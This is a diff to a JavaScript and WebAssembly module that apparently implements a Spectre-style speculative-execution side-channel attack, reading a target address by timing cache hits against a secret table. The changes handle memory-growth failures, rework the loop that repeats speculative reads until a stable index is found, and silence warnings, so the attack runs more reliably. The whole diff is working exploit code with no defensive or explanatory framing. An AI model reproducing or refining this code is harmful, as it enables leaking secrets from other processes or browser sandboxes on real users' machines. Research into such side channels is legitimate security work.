@@ -27,9 +27,15 @@ export default
                 // console.log("malloc request", size);
                 const need = current_memory_position + size - wasm_memory.buffer.byteLength;
                 if (need > 0) {
-                    console.log("malloc needs", Math.ceil(need / (1 << 16)), "pages");
-                    wasm_memory.grow(Math.ceil(need / (1 << 16)));
-                    secret_table = new Uint8Array(wasm_memory.buffer, instance.exports.getSecretTableAddress(), 4 << 12);
+                    // console.log("malloc needs", Math.ceil(need / (1 << 16)), "pages");
+                    try {
+                        wasm_memory.grow(Math.ceil(need / (1 << 16)));
+                        secret_table = new Uint8Array(wasm_memory.buffer, instance.exports.getSecretTableAddress(), 4 << 12);
+                    } catch (error) {
+                        // reached alloc limit -> reuse memory
+                        // console.log(wasm_memory.buffer.byteLength);
+                        current_memory_position = (4 << 12) * 2;
+                    }
                 }
                 try {
                     // console.log("malloc response", current_memory_position);
@@ -71,19 +77,18 @@ export default
         
         let i = 0;
         let total_iterations = 0;
-        const _min_iterations = min_iterations * speculative_repetitions;
-        for (let j = 0; i < _min_iterations && j < _min_iterations; ++total_iterations) {
+        for (; i < min_iterations; ++total_iterations) {
             _speculativelyReadAddress(address, speculative_repetitions, page_size, probe_length);
-            // proces time tables
+            // process time tables
+            let high_mean_time;
             for (const time_table of time_tables) {
                 const mean_time = indicator_table.processTimetable(time_table, max_cache_hit_number);
                 // lower limit check is done by indicator_table
                 if (mean_time) {
                     mean_times.push(mean_time);
-                    j = 0;
+                    high_mean_time = true;
                 } else {
                     // console.warn("slow timer");
-                    ++j;
                     continue;
                 }
                 // console.log(`%cprobe index time ${time_table[probe_index]}`, "font-size: .9em");
@@ -100,11 +105,13 @@ export default
                 if (max_indicator_index != current_max_indicator_index) {
                     i = (current_max_indicator_index !== undefined) | 0;
                     max_indicator_index = current_max_indicator_index;
-                    ++j;
                     // console.warn("max_indicator_index changed");
                 } else {
                     ++i;
                 }
+            }
+            if (total_iterations > min_iterations && !high_mean_time) {
+                break;
             }
 
             time_tables.length = 0;
@@ -112,7 +119,7 @@ export default
         const mean_time = mean(mean_times);
         if (i < min_iterations) {
             max_indicator_index = undefined;
-            console.warn("index test failed");
+            // console.warn("index test failed");
         }
         // prepare results
         let second_indicator = -Infinity;
